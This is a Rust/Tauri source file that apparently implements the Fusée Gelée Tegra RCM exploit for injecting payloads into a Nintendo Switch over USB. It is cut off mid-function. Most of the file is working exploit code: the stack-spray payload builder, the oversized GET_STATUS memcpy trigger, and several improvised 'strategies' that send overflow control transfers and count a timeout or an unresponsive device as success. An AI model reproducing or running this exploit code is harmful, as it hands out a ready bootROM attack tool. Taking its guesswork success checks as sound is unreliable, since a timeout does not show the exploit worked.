use reqwest::blocking;
use serde::{Deserialize, Serialize};
use std::path::Path;
use tokio;
use tauri::Manager;

// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/

// Fusée Gelée constants - ported from Python implementation

// The address where the RCM payload is placed.
// This is fixed for most device.
const RCM_PAYLOAD_ADDR: u32 = 0x40010000;

// The address where the user payload is expected to begin.
const PAYLOAD_START_ADDR: u32 = 0x40010E40;

// Specify the range of addresses where we should inject oct
// payload address.
const STACK_SPRAY_START: u32 = 0x40014E40;
const STACK_SPRAY_END: u32 = 0x40017000;

// USB constants
const RCM_VID: u16 = 0x0955;
const RCM_PID: u16 = 0x7321;

// USB control request constants
const STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT: u8 = 0x82;
const GET_STATUS: u8 = 0x0;

/// Backend for handling USB operations with the RCM device.
/// Simple vulnerability trigger for macOS: we simply ask libusb to issue
/// the broken control request, and it'll do it for us.
/// We also support platforms with a hacked libusb and FreeBSD.
struct Backend {
    _skip_checks: bool,
}

impl Backend {
    fn new(_skip_checks: bool) -> Self {
        Self { _skip_checks }
    }

    fn print_warnings(&self) {
        // Print any warnings necessary for the given backend.
        // Currently no warnings for our implementation
    }

    fn trigger_vulnerability(
        &self,
        device: &rusb::DeviceHandle<rusb::GlobalContext>,
        length: usize,
    ) -> Result<(), rusb::Error> {
        // Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
        // Note: This will timeout when successful because the device crashes!
        let mut buffer = vec![0u8; length];
        match device.read_control(
            STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT,
            GET_STATUS,
            0,
            0,
            &mut buffer,
            std::time::Duration::from_millis(1000),
        ) {
            Ok(_) => Ok(()), // This shouldn't normally happen with the vulnerability
            Err(rusb::Error::Timeout) => Ok(()), // Timeout = success! Device crashed
            Err(e) => Err(e), // Other errors are actual failures
        }
    }

    fn read(
        &self,
        device: &rusb::DeviceHandle<rusb::GlobalContext>,
        length: usize,
    ) -> Result<Vec<u8>, rusb::Error> {
        // Reads data from the RCM protocol endpoint.
        let mut buffer = vec![0u8; length];
        let bytes_read =
            device.read_bulk(0x81, &mut buffer, std::time::Duration::from_millis(1000))?;
        buffer.truncate(bytes_read);
        Ok(buffer)
    }

    fn write_single_buffer(
        &self,
        device: &rusb::DeviceHandle<rusb::GlobalContext>,
        data: &[u8],
    ) -> Result<usize, rusb::Error> {
        // Writes a single RCM buffer, which should be 0x1000 long.
        // The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        // If it's not, send a ZLP.
        device.write_bulk(0x01, data, std::time::Duration::from_millis(1000))
    }

    fn find_device(
        &self,
        vid: Option<u16>,
        pid: Option<u16>,
    ) -> Result<rusb::Device<rusb::GlobalContext>, rusb::Error> {
        // Set and return the device to be used
        let vid = vid.unwrap_or(RCM_VID);
        let pid = pid.unwrap_or(RCM_PID);

        // Find the device
        let device = rusb::devices()?
            .iter()
            .find(|device| {
                if let Ok(desc) = device.device_descriptor() {
                    desc.vendor_id() == vid && desc.product_id() == pid
                } else {
                    false
                }
            })
            .ok_or(rusb::Error::NoDevice)?;

        Ok(device)
    }

    fn create_appropriate_backend(
        _system_override: Option<&str>,
        skip_checks: bool,
    ) -> Result<Self, String> {
        // Creates a backend object appropriate for the current OS.
        // For now, we support all platforms the same way
        Ok(Self::new(skip_checks))
    }
}

/// RCMHax manages the connection to the RCM device and handles the exploit.
struct RCMHax {
    backend: Backend,
    device: rusb::DeviceHandle<rusb::GlobalContext>,
    current_buffer: usize,
    _total_written: usize,
}

impl RCMHax {
    // Default to the Nintendo Switch RCM VID and PID.
    const DEFAULT_VID: u16 = 0x0955;
    const DEFAULT_PID: u16 = 0x7321;

    // Exploit specifics
    const COPY_BUFFER_ADDRESSES: [u32; 2] = [0x40005000, 0x40009000]; // The addresses of the DMA buffers we can trigger a copy _from_.
    const STACK_END: u32 = 0x40010000; // The address just after the end of the device's stack.

    fn new(
        wait_for_device: bool,
        os_override: Option<&str>,
        vid: Option<u16>,
        pid: Option<u16>,
        override_checks: bool,
    ) -> Result<Self, String> {
        // Set up our RCM hack connection.

        // The first write into the bootROM touches the lowbuffer.
        let current_buffer = 0;

        // Keep track of the total amount written.
        let _total_written = 0;

        // Create a vulnerability backend for the given device.
        let backend =
            Backend::create_appropriate_backend(os_override, override_checks).map_err(|_| {
                "No backend to trigger the vulnerability-- it's likely we don't support your OS!"
            })?;

        // Grab a connection to the USB device itself.
        let device = Self::_find_device(&backend, vid, pid)?;

        // If we don't have a device...
        let device_handle = if device.is_none() {
            // ... and we're allowed to wait for one, wait indefinitely for one to appear...
            if wait_for_device {
                println!("Waiting for a TegraRCM device to come online...");
                loop {
                    let found_device = Self::_find_device(&backend, vid, pid)?;
                    if found_device.is_some() {
                        break found_device.unwrap();
                    }
                    std::thread::sleep(std::time::Duration::from_millis(500));
                }
            } else {
                return Err("No TegraRCM device found?".to_string());
            }
        } else {
            device.unwrap()
        };

        // Print any use-related warnings.
        backend.print_warnings();

        // For RCM devices, we need to claim the interface to communicate
        // Find the interface and claim it
        let _device_descriptor = device_handle
            .device()
            .device_descriptor()
            .map_err(|e| format!("Failed to get device descriptor: {}", e))?;
        let config_descriptor = device_handle
            .device()
            .active_config_descriptor()
            .map_err(|e| format!("Failed to get config descriptor: {}", e))?;

        // Claim the first interface (typically interface 0 for RCM devices)
        if let Some(interface) = config_descriptor.interfaces().next() {
            if let Some(interface_desc) = interface.descriptors().next() {
                let interface_number = interface_desc.interface_number();
                device_handle
                    .claim_interface(interface_number)
                    .map_err(|e| {
                        format!("Failed to claim interface {}: {}", interface_number, e)
                    })?;
                println!("Claimed interface {}", interface_number);
            }
        }

        // Notify the user of which backend we're using.
        //println!("Identified a {} system; setting up the appropriate backend.", backend.backend_name());

        Ok(Self {
            backend,
            device: device_handle,
            current_buffer,
            _total_written,
        })
    }

    fn _find_device(
        backend: &Backend,
        vid: Option<u16>,
        pid: Option<u16>,
    ) -> Result<Option<rusb::DeviceHandle<rusb::GlobalContext>>, String> {
        // Attempts to get a connection to the RCM device with the given VID and PID.
        // Apply our default VID and PID if neither are provided...
        let vid = vid.unwrap_or(Self::DEFAULT_VID);
        let pid = pid.unwrap_or(Self::DEFAULT_PID);

        // ... and use them to find a USB device.
        match backend.find_device(Some(vid), Some(pid)) {
            Ok(device) => match device.open() {
                Ok(handle) => Ok(Some(handle)),
                Err(_) => Ok(None),
            },
            Err(_) => Ok(None),
        }
    }

    fn read(&self, length: usize) -> Result<Vec<u8>, rusb::Error> {
        // Reads data from the RCM protocol endpoint.
        self.backend.read(&self.device, length)
    }

    fn write(&mut self, data: &[u8]) -> Result<(), rusb::Error> {
        // Writes data to the main RCM protocol endpoint.
        let mut remaining = data.len();
        let packet_size = 0x1000;

        while remaining > 0 {
            let data_to_transmit = std::cmp::min(remaining, packet_size);
            let chunk = &data[data.len() - remaining..data.len() - remaining + data_to_transmit];
            remaining -= data_to_transmit;

            self.write_single_buffer(chunk)?;
        }
        Ok(())
    }

    fn write_single_buffer(&mut self, data: &[u8]) -> Result<usize, rusb::Error> {
        // Writes a single RCM buffer, which should be 0x1000 long.
        // The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        // If it's not, send a ZLP.

        self._toggle_buffer();
        self.backend.write_single_buffer(&self.device, data)
    }

    fn _toggle_buffer(&mut self) {
        // Toggles the active target buffer, paralleling the operation happening in
        // RCM on the X1 device.
        self.current_buffer = 1 - self.current_buffer;
    }

    fn get_current_buffer_address(&self) -> u32 {
        // Returns the base address for the current copy.
        Self::COPY_BUFFER_ADDRESSES[self.current_buffer]
    }

    fn read_device_id(&self) -> Result<Vec<u8>, rusb::Error> {
        // Reads the Device ID via RCM. Only valid at the start of the communication.
        self.read(16)
    }

    fn switch_to_highbuf(&mut self) -> Result<(), rusb::Error> {
        // Switches to the higher RCM buffer, reducing the amount that needs to be copied.
        if self.get_current_buffer_address() != Self::COPY_BUFFER_ADDRESSES[1] {
            self.write_single_buffer(&[0u8; 0x1000])?;
        }
        Ok(())
    }

    fn trigger_controlled_memcpy(&self, length: Option<usize>) -> Result<(), rusb::Error> {
        // Triggers the RCM vulnerability, causing it to make a significantly-oversized memcpy.
        // Determine how much we'd need to transmit to smash the full stack.
        let length =
            length.unwrap_or((Self::STACK_END - self.get_current_buffer_address()) as usize);
        self.backend.trigger_vulnerability(&self.device, length)
    }
}

/// Payload construction utilities
fn build_payload(target_payload: &[u8], intermezzo_path: &Path) -> Result<Vec<u8>, String> {
    // Read our intermezzo relocator...
    let intermezzo_path = intermezzo_path.to_str().ok_or("Invalid intermezzo path")?;

    if !Path::new(intermezzo_path).exists() {
        return Err("Could not find the intermezzo interposer. Did you build it?".to_string());
    }

    let intermezzo =
        std::fs::read(intermezzo_path).map_err(|e| format!("Failed to read intermezzo: {}", e))?;

    let intermezzo_size = intermezzo.len();

    // Prefix the image with an RCM command, so it winds up loaded into memory
    // at the right location (0x40010000).
    // Use the maximum length accepted by RCM, so we can transmit as much payload as
    // we want; we'll take over before we get to the end.

    let length: u32 = 0x30298;
    let mut payload = length.to_le_bytes().to_vec();

    // pad out to 680 so the payload starts at the right address in IRAM
    payload.extend(vec![0u8; 680 - payload.len()]);

    // Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
    // We'll use this data to smash the stack when we execute the vulnerable memcpy.

    println!("Setting ourselves up to smash the stack...");

    // Include the Intermezzo binary in the command stream. This is our first-stage
    // payload, and it's responsible for relocating the final payload to 0x40010000.

    payload.extend(&intermezzo);

    // Pad the payload till the start of the user payload.
    let padding_size = (PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size as u32)) as usize;
    payload.extend(vec![0u8; padding_size]);

    // Fit a collection of the payload before the stack spray...
    let padding_size = (STACK_SPRAY_START - PAYLOAD_START_ADDR) as usize;
    payload.extend(&target_payload[..std::cmp::min(padding_size, target_payload.len())]);

    // ... insert the stack spray...
    let repeat_count = ((STACK_SPRAY_END - STACK_SPRAY_START) / 4) as usize;
    for _ in 0..repeat_count {
        payload.extend(&RCM_PAYLOAD_ADDR.to_le_bytes());
    }

    // ... and follow the stack spray with the remainder of the payload.
    if padding_size < target_payload.len() {
        payload.extend(&target_payload[padding_size..]);
    }

    // Pad the payload to fill a USB request exactly, so we don't send a short
    // packet and break out of the RCM loop.
    let payload_length = payload.len();
    let padding_size = 0x1000 - (payload_length % 0x1000);
    payload.extend(vec![0u8; padding_size]);

    // Check to see if our payload packet will fit inside the RCM high buffer.
    // If it won't, error out.
    if payload.len() > length as usize {
        let size_over = payload.len() - length as usize;
        return Err(format!(
            "ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).",
            size_over
        ));
    }

    Ok(payload)
}

/// Main exploit function - equivalent to try_push in Python
fn execute_fusee_gelee_exploit(
    target_payload_path: &str,
    intermezzo_path: &str,
) -> Result<String, String> {
    // Read our arguments.

    // Find our intermezzo relocator...
    let intermezzo_path = Path::new(intermezzo_path);
    if !intermezzo_path.exists() {
        return Err("Could not find the intermezzo interposer. Did you build it?".to_string());
    }

    // Get a connection to our device.
    let mut switch = RCMHax::new(false, None, Some(RCM_VID), Some(RCM_PID), false)?;

    // Print the device's ID. Note that reading the device's ID is necessary to get it into
    // the right state, but we'll make it optional since some devices might not support it
    match switch.read_device_id() {
        Ok(device_id) => println!("Found a Tegra with Device ID: {:?}", device_id),
        Err(e) => {
            println!(
                "Warning: Could not read device ID (this may be normal): {}",
                e
            );
            println!("Continuing with exploit anyway...");
        }
    }

    // Read the target payload
    let target_payload = std::fs::read(target_payload_path)
        .map_err(|e| format!("Failed to read payload file: {}", e))?;

    // Build the complete payload with intermezzo and stack spray
    let payload = build_payload(&target_payload, intermezzo_path)?;

    // Send the constructed payload, which contains the command, the stack smashing
    // values, the Intermezzo relocation stub, and the final payload.
    println!("Uploading payload...");
    switch
        .write(&payload)
        .map_err(|e| format!("Failed to upload payload: {}", e))?;

    // The RCM backend alternates between two different DMA buffers. Ensure we're
    // about to DMA into the higher one, so we have less to copy during our attack.
    switch
        .switch_to_highbuf()
        .map_err(|e| format!("Failed to switch to high buffer: {}", e))?;

    // Smash the device's stack, triggering the vulnerability.
    println!("Smashing the stack...");
    let result = match switch.trigger_controlled_memcpy(None) {
        Ok(_) => {
            println!("✅ Exploit completed successfully!");
            println!("🎉 The payload has been injected and the device has been rebooted.");
            Ok("🎯 Payload injection successful! Check your Switch - it should be running the payload now!".to_string())
        }
        Err(rusb::Error::Timeout) => {
            // Timeout during trigger = SUCCESS! The device crashed as expected
            println!("✅ Exploit completed successfully (device timed out as expected)!");
            println!("🎉 The payload has been injected and the device has crashed/rebooted.");
            Ok("🎯 Payload injection successful! The Switch crashed as expected - check if your payload is running!".to_string())
        }
        Err(e) => {
            // Other errors are actual failures
            Err(format!("Exploit failed: {}", e))
        }
    };

    // Try to release the interface
    // Note: We can't easily get the interface number here, so we'll skip this for now
    // The interface will be released when the device handle is dropped

    result
}
#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[derive(Serialize, Deserialize)]
pub struct DeviceInfo {
    pub vendor_id: u16,
    pub product_id: u16,
    pub manufacturer: Option<String>,
    pub product: Option<String>,
    pub serial_number: Option<String>,
}

#[derive(Serialize, Deserialize)]
pub struct RcmStatus {
    pub device_connected: bool,
    pub device_info: Option<DeviceInfo>,
    pub rcm_detected: bool,
    pub switch_connected_not_rcm: bool,
}

// Nintendo Switch RCM constants
const NINTENDO_VENDOR_ID: u16 = 0x0955;
const SWITCH_RCM_PRODUCT_ID: u16 = 0x7321;

#[tauri::command]
async fn detect_rcm_device() -> Result<RcmStatus, String> {
    match rusb::devices() {
        Ok(devices) => {
            // Limit devices to check for safety
            for device in devices.iter().take(20) {
                match device.device_descriptor() {
                    Ok(desc) => {
                        if desc.vendor_id() == NINTENDO_VENDOR_ID
                            && desc.product_id() == SWITCH_RCM_PRODUCT_ID
                        {
                            // Found Switch in RCM mode
                            let device_info = device.open().ok().map(|handle| DeviceInfo {
                                vendor_id: desc.vendor_id(),
                                product_id: desc.product_id(),
                                manufacturer: handle.read_manufacturer_string_ascii(&desc).ok(),
                                product: handle.read_product_string_ascii(&desc).ok(),
                                serial_number: handle.read_serial_number_string_ascii(&desc).ok(),
                            });

                            return Ok(RcmStatus {
                                device_connected: true,
                                device_info,
                                rcm_detected: true,
                                switch_connected_not_rcm: false,
                            });
                        }
                    }
                    Err(_) => continue,
                }
            }
            // Check for a Nintendo Switch that is NOT in RCM
            for device in devices.iter().take(20) {
                if let Ok(desc) = device.device_descriptor() {
                    if desc.vendor_id() == 0x057E {
                        let device_info = device.open().ok().map(|handle| DeviceInfo {
                            vendor_id: desc.vendor_id(),
                            product_id: desc.product_id(),
                            manufacturer: handle.read_manufacturer_string_ascii(&desc).ok(),
                            product: handle.read_product_string_ascii(&desc).ok(),
                            serial_number: handle.read_serial_number_string_ascii(&desc).ok(),
                        });

                        return Ok(RcmStatus {
                            device_connected: true,
                            device_info,
                            rcm_detected: false,
                            switch_connected_not_rcm: true,
                        });
                    }
                }
            }
            // No RCM device found
            Ok(RcmStatus {
                device_connected: false,
                device_info: None,
                rcm_detected: false,
                switch_connected_not_rcm: false,
            })
        }
        Err(e) => Err(format!("Failed to enumerate USB devices: {}", e)),
    }
}

#[tauri::command]
async fn get_rcm_status() -> Result<RcmStatus, String> {
    // Get current RCM status by rescanning
    detect_rcm_device().await
}

#[tauri::command]
fn get_app_version() -> String {
    // CARGO_PKG_VERSION is an environment variable automatically set by Cargo
    // to the version specified in your Cargo.toml file.
    option_env!("CARGO_PKG_VERSION")
        .unwrap_or("unknown")
        .to_string()
}

#[tauri::command]
async fn inject_payload(payload_path: String, app_handle: tauri::AppHandle) -> Result<String, String> {
    println!("Starting Fusée Gelée exploit (Rust implementation based on Python original)...");
    println!("Payload path: {}", payload_path);

    // Check if payload file exists
    if !std::path::Path::new(&payload_path).exists() {
        return Err(format!("Payload file does not exist: {}", payload_path));
    }

    // Use Tauri v2 API to resolve resource path
    let resource_path = app_handle
        .path()
        .resolve("assets/intermezzo.bin", tauri::path::BaseDirectory::Resource)
        .map_err(|e| format!("Could not resolve intermezzo.bin path: {}", e))?;
    
    if !resource_path.exists() {
        return Err(format!("Intermezzo binary not found at: {:?}. Please ensure you have built the intermezzo relocator.", resource_path));
    }

    let intermezzo_path_str = resource_path.to_str()
        .ok_or("Invalid intermezzo path")?;

    // Execute the exploit using our faithful Rust implementation
    match execute_fusee_gelee_exploit(&payload_path, intermezzo_path_str) {
        Ok(msg) => Ok(msg),
        Err(e) => {
            println!("Exploit failed: {}", e);
            Err(e)
        }
    }
}

fn diagnose_device_state(
    handle: &rusb::DeviceHandle<rusb::GlobalContext>,
    bulk_out_ep: u8,
) -> Result<(), String> {
    println!("Running device diagnostics...");

    // Test 1: Basic control transfer responsiveness
    let mut buffer = [0u8; 2];
    match handle.read_control(
        0x80,
        0x00,
        0x0000,
        0x00,
        &mut buffer,
        std::time::Duration::from_millis(100),
    ) {
        Ok(len) => println!("  ✓ Control transfer test: {} bytes received", len),
        Err(e) => return Err(format!("Control transfer test failed: {}", e)),
    }

    // Test 2: Try a minimal bulk transfer
    let test_data = [0u8; 0x40]; // 64 bytes
    match handle.write_bulk(
        bulk_out_ep,
        &test_data,
        std::time::Duration::from_millis(50),
    ) {
        Ok(written) => {
            println!("  ✓ Minimal bulk transfer test: {} bytes sent", written);
            Ok(())
        }
        Err(e) => {
            if e.to_string().contains("timeout") {
                Err(
                    "Device not accepting bulk transfers - may not be in proper RCM state"
                        .to_string(),
                )
            } else {
                Err(format!("Bulk transfer test failed: {}", e))
            }
        }
    }
}

fn perform_fusee_gelee_exploit(
    handle: &rusb::DeviceHandle<rusb::GlobalContext>,
    interface_number: u8,
    bulk_out_ep: u8,
    payload_data: &[u8],
) -> Result<String, String> {
    println!("Starting Fusée Gelée exploit (based on crystalRCM and rajkosto implementations)...");

    // Claim interface
    if let Err(e) = handle.claim_interface(interface_number) {
        return Err(format!("Failed to claim interface: {}", e));
    }

    // Strategy 1: Try the classic "bulk interrupt" approach (original rajkosto method)
    println!("Strategy 1: Classic bulk interrupt approach");
    match try_classic_bulk_interrupt(handle, bulk_out_ep, payload_data) {
        Ok(msg) => return Ok(msg),
        Err(e) => println!("Strategy 1 failed: {}", e),
    }

    // Strategy 2: Try the "primed device" approach (crystalRCM style)
    println!("Strategy 2: Primed device approach");
    match try_primed_device_exploit(handle, bulk_out_ep, payload_data) {
        Ok(msg) => return Ok(msg),
        Err(e) => println!("Strategy 2 failed: {}", e),
    }

    // Strategy 3: Try aggressive timing approach
    println!("Strategy 3: Aggressive timing approach");
    match try_aggressive_timing_exploit(handle, bulk_out_ep, payload_data) {
        Ok(msg) => return Ok(msg),
        Err(e) => println!("Strategy 3 failed: {}", e),
    }

    // Strategy 4: Try device reset and minimal payload approach
    println!("Strategy 4: Device reset and minimal payload");
    match try_device_reset_exploit(handle, bulk_out_ep, payload_data) {
        Ok(msg) => return Ok(msg),
        Err(e) => println!("Strategy 4 failed: {}", e),
    }

    println!("\n❌ All exploit strategies failed.");
    println!("📋 Troubleshooting suggestions:");
    println!("  • Make sure Switch is properly in RCM mode (hold VOL+ + VOL- + POWER)");
    println!("  • Try replugging the USB cable");
    println!("  • Try a different USB port on your computer");
    println!("  • Make sure no other programs are accessing the USB device");
    println!("  • Try power cycling the Switch and entering RCM again");
    println!("  • Check if your Switch firmware is supported (most are vulnerable)");
    println!("\n💡 If the issue persists, the device may be in an error state or not actually in RCM mode.");

    Err("All exploit strategies failed. See troubleshooting suggestions above.".to_string())
}

#[tauri::command]
async fn download_payload(url: String, filename: String) -> Result<String, String> {
    // Get the download directory (platform-specific app data directory)
    let download_dir = dirs::download_dir().ok_or("Could not determine download directory")?;

    // Create payloads subdirectory
    let payloads_dir = download_dir.join("payloads");
    std::fs::create_dir_all(&payloads_dir)
        .map_err(|e| format!("Failed to create payloads directory: {}", e))?;

    // Use spawn_blocking to run the synchronous HTTP request
    let url_clone = url.clone();
    let filename_clone = filename.clone();

    let result = tokio::task::spawn_blocking(move || {
        // Download the file using blocking client
        let response =
            blocking::get(&url_clone).map_err(|e| format!("Failed to download file: {}", e))?;

        if !response.status().is_success() {
            return Err(format!(
                "Download failed with status: {}",
                response.status()
            ));
        }

        let content = response
            .bytes()
            .map_err(|e| format!("Failed to read response: {}", e))?;

        // Save to file
        let payloads_dir = download_dir.join("payloads");
        let file_path = payloads_dir.join(&filename_clone);
        std::fs::write(&file_path, content).map_err(|e| format!("Failed to save file: {}", e))?;

        Ok(file_path.to_string_lossy().to_string())
    })
    .await;

    match result {
        Ok(inner_result) => inner_result,
        Err(e) => Err(format!("Task failed: {}", e)),
    }
}

fn try_classic_bulk_interrupt(
    handle: &rusb::DeviceHandle<rusb::GlobalContext>,
    bulk_out_ep: u8,
    payload_data: &[u8],
) -> Result<String, String> {
    println!("  Attempting classic bulk interrupt method...");

    // Send initial bulk data with very short timeout
    let initial_chunk = &payload_data[0..std::cmp::min(0x1000, payload_data.len())];

    match handle.write_bulk(
        bulk_out_ep,
        initial_chunk,
        std::time::Duration::from_millis(50),
    ) {
        Ok(_) => {
            // Bulk transfer succeeded - device is accepting data normally
            // This means exploit didn't trigger, try a different approach
            return Err("Device accepted bulk data normally - exploit not triggered".to_string());
        }
        Err(e) => {
            if e.to_string().contains("timeout") {
                println!("  ✓ Bulk transfer timed out as expected - sending overflow control transfer...");

                // Send the overflow control transfer immediately after timeout
                let mut overflow_buffer = vec![0u8; 0xFFFF];
                match handle.read_control(
                    0x82,               // bmRequestType: IN | STANDARD | ENDPOINT
                    0x00,               // bRequest: GET_STATUS
                    0x0000,             // wValue
                    bulk_out_ep as u16, // wIndex: target bulk endpoint
                    &mut overflow_buffer,
                    std::time::Duration::from_millis(100),
                ) {
                    Ok(_) => println!("  ✓ Control transfer succeeded"),
                    Err(e) => println!("  ⚠ Control transfer failed: {}", e),
                }

                // Check if device is still responsive
                std::thread::sleep(std::time::Duration::from_millis(50));
                match handle.write_bulk(
                    bulk_out_ep,
                    &payload_data[0..0x100],
                    std::time::Duration::from_millis(50),
                ) {
                    Ok(_) => Err("Device still responsive - exploit failed".to_string()),
                    Err(_) => Ok(
                        "✓ Classic bulk interrupt exploit succeeded! Device crashed/rebooted."
                            .to_string(),
                    ),
                }
            } else {
                Err(format!("Unexpected bulk transfer error: {}", e))
            }
        }
    }
}

fn try_primed_device_exploit(
    handle: &rusb::DeviceHandle<rusb::GlobalContext>,
    bulk_out_ep: u8,
    payload_data: &[u8],
) -> Result<String, String> {
    println!("  Attempting primed device method...");

    // Send multiple control transfers to "prime" the device (crystalRCM approach)
    let mut overflow_buffer = vec![0u8; 0xFFFF];

    for i in 1..=5 {
        match handle.read_control(
            0x80,   // Device-directed
            0x00,   // GET_STATUS
            0x0000, // wValue
            0x00,   // wIndex (device)
            &mut overflow_buffer,
            std::time::Duration::from_millis(200),
        ) {
            Ok(_) => println!("  ✓ Prime control transfer {} succeeded", i),
            Err(e) => println!("  ⚠ Prime control transfer {} failed: {}", i, e),
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }

    // Now try bulk transfer
    match handle.write_bulk(
        bulk_out_ep,
        &payload_data[0..0x1000],
        std::time::Duration::from_millis(1000),
    ) {
        Ok(written) => {
            println!(
                "  ✓ Bulk transfer succeeded ({} bytes) after priming",
                written
            );

            // Device accepted data - try interleaving control transfers
            let mut bytes_sent = written;
            let mut alternate = false;

            while bytes_sent < payload_data.len() {
                let remaining = payload_data.len() - bytes_sent;
                let chunk_size = std::cmp::min(remaining, 0x1000);
                let chunk = &payload_data[bytes_sent..bytes_sent + chunk_size];

                if alternate {
                    // Send control transfer
                    let mut overflow_buffer = vec![0u8; 0xFFFF];
                    let _ = handle.read_control(
                        0x82,
                        0x00,
                        0x0000,
                        bulk_out_ep as u16,
                        &mut overflow_buffer,
                        std::time::Duration::from_millis(50),
                    );
                }

                alternate = !alternate;

                match handle.write_bulk(bulk_out_ep, chunk, std::time::Duration::from_millis(200)) {
                    Ok(written) => {
                        bytes_sent += written;
                        println!("  ✓ Sent {} bytes, total: {} bytes", written, bytes_sent);
                    }
                    Err(e) => {
                        if e.to_string().contains("timeout") {
                            // Check if device crashed
                            std::thread::sleep(std::time::Duration::from_millis(20));
                            match handle.write_bulk(bulk_out_ep, &payload_data[0..0x100], std::time::Duration::from_millis(20)) {
                                Ok(_) => continue, // Device still responsive, keep trying
                                Err(_) => return Ok("✓ Primed device exploit succeeded! Device became unresponsive.".to_string()),
                            }
                        }
                        return Err(format!("Bulk transfer failed: {}", e));
                    }
                }
            }

            Err("Completed all data transfer without triggering exploit".to_string())
        }
        Err(e) => {
            if e.to_string().contains("timeout") {
                // Device timed out immediately - try control transfer
                let mut overflow_buffer = vec![0u8; 0xFFFF];
                let _ = handle.read_control(
                    0x82,
                    0x00,
                    0x0000,
                    bulk_out_ep as u16,
                    &mut overflow_buffer,
                    std::time::Duration::from_millis(100),
                );

                // Check responsiveness
                std::thread::sleep(std::time::Duration::from_millis(50));
                match handle.write_bulk(
                    bulk_out_ep,
                    &payload_data[0..0x100],
                    std::time::Duration::from_millis(50),
                ) {
                    Ok(_) => Err("Device still responsive after primed timeout".to_string()),
                    Err(_) => Ok(
                        "✓ Primed device exploit succeeded! Device became unresponsive."
                            .to_string(),
                    ),
                }
            } else {
                Err(format!("Bulk transfer failed: {}", e))
            }
        }
    }
}

fn try_aggressive_timing_exploit(
    handle: &rusb::DeviceHandle<rusb::GlobalContext>,
    bulk_out_ep: u8,
    payload_data: &[u8],
) -> Result<String, String> {
    println!("  Attempting aggressive timing method...");

    // Use extremely short timeouts and rapid control transfers
    let mut overflow_buffer = vec![0u8; 0xFFFF];

    for chunk_start in (0..payload_data.len()).step_by(0x800) {
        let chunk_end = std::cmp::min(chunk_start + 0x800, payload_data.len());
        let chunk = &payload_data[chunk_start..chunk_end];

        // Send control transfer, then immediately try bulk transfer
        let _ = handle.read_control(
            0x82,
            0x00,
            0x0000,
            bulk_out_ep as u16,
            &mut overflow_buffer,
            std::time::Duration::from_millis(10),
        );

        match handle.write_bulk(bulk_out_ep, chunk, std::time::Duration::from_millis(10)) {
            Ok(written) => {
                println!("  ✓ Aggressive chunk sent ({} bytes)", written);
            }
            Err(e) => {
                if e.to_string().contains("timeout") {
                    // Check if device crashed
                    std::thread::sleep(std::time::Duration::from_micros(500));
                    match handle.write_bulk(
                        bulk_out_ep,
                        &payload_data[0..0x100],
                        std::time::Duration::from_micros(500),
                    ) {
                        Ok(_) => continue, // Device still responsive, keep trying
                        Err(_) => return Ok(
                            "✓ Aggressive timing exploit succeeded! Device became unresponsive."
                                .to_string(),
                        ),
                    }
                }
                return Err(format!("Aggressive transfer failed: {}", e));
            }
        }

        std::thread::sleep(std::time::Duration::from_micros(500));
    }

    Err("Aggressive timing completed without triggering exploit".to_string())
}

fn try_device_reset_exploit(
    handle: &rusb::DeviceHandle<rusb::GlobalContext>,
    bulk_out_ep: u8,
    payload_data: &[u8],
) -> Result<String, String> {
    println!("  Attempting device reset method...");

    // Try to reset the device (if supported)
    if let Err(e) = handle.reset() {
        println!("  ⚠ Device reset not supported or failed: {}", e);
    } else {
        println!("  ✓ Device reset attempted");
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    // Try clearing halt condition on endpoints
    let _ = handle.clear_halt(bulk_out_ep);
    println!("  ✓ Cleared halt condition on bulk endpoint");

    // Try a very minimal payload approach - just send a small chunk and overflow
    let minimal_chunk = if payload_data.len() >= 0x1000 {
        &payload_data[0..0x1000]
    } else {
        payload_data
    };

    // Send minimal data with very short timeout
    match handle.write_bulk(
        bulk_out_ep,
        minimal_chunk,
        std::time::Duration::from_millis(10),
    ) {
        Ok(_) => {
            println!("  ✓ Minimal bulk transfer succeeded after reset - device is responsive");
            // If it succeeds, try overflow immediately
            let mut overflow_buffer = vec![0u8; 0xFFFF];
            let _ = handle.read_control(
                0x82,
                0x00,
                0x0000,
                bulk_out_ep as u16,
                &mut overflow_buffer,
                std::time::Duration::from_millis(50),
            );

            // Check if device crashed
            std::thread::sleep(std::time::Duration::from_millis(20));
            match handle.write_bulk(
                bulk_out_ep,
                &payload_data[0..0x100],
                std::time::Duration::from_millis(20),
            ) {
                Ok(_) => Err("Device still responsive after reset + overflow attempt".to_string()),
                Err(_) => Ok("✓ Device reset + minimal payload exploit succeeded!".to_string()),
            }
        }
        Err(e) => {
            if e.to_string().contains("timeout") {
                println!("  ✓ Minimal bulk transfer timed out after reset - trying overflow");

                // Send overflow control transfer
                let mut overflow_buffer = vec![0u8; 0xFFFF];
                let _ = handle.read_control(
                    0x82,
                    0x00,
                    0x0000,
                    bulk_out_ep as u16,
                    &mut overflow_buffer,
                    std::time::Duration::from_millis(100),
                );

                // Check if device is still responsive
                std::thread::sleep(std::time::Duration::from_millis(50));
                match handle.write_bulk(
                    bulk_out_ep,
                    &payload_data[0..0x100],
                    std::time::Duration::from_millis(50),
                ) {
                    Ok(_) => Err("Device still responsive after reset timeout".to_string()),
                    Err(_) => Ok("✓ Device reset + timeout exploit succeeded!".to_string()),
                }
            } else {
                Err(format!("Reset method failed: {}", e))
            }
        }
    }
}

#[tauri::command]
async fn list_usb_devices() -> Result<Vec<DeviceInfo>, String> {
    match rusb::devices() {
        Ok(devices) => {
            let mut device_list = Vec::new();

            // Limit the number of devices we process to prevent issues
            let max_devices = 50;
            let devices_to_check = devices.iter().take(max_devices);

            for device in devices_to_check {
                match device.device_descriptor() {
                    Ok(desc) => {
                        // Skip devices that might cause issues
                        if desc.vendor_id() == 0 || desc.product_id() == 0 {
                            continue;
